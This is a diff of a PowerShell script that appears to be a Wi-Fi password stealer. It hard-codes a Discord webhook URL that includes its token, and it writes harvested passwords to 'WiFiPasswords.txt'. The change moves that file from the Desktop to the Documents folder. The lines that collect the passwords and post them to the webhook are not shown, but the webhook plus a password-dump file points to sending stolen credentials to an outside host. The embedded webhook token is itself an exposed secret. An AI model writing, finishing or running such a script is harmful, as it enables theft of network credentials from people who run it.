@@ -1,8 +1,7 @@
 ﻿$discordWebhookUrl = 'https://discord.com/api/webhooks/1431426274428977193/81wq62g5M9t47PwGnH4ZK6ZBJKM8aPrOxmn89SJK2t5edM23F3djYG0x3InvdPYGMK_2'
 
-$desktop = [Environment]::GetFolderPath('Desktop')
-if (-not (Test-Path $desktop)) { $desktop = [Environment]::GetFolderPath('MyDocuments') }
-$Output = Join-Path $desktop 'WiFiPasswords.txt'
+$documents = [Environment]::GetFolderPath('MyDocuments')
+$Output = Join-Path $documents 'WiFiPasswords.txt'
 
 "Wi-Fi passwords collected on $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File $Output -Encoding UTF8 -Force
 
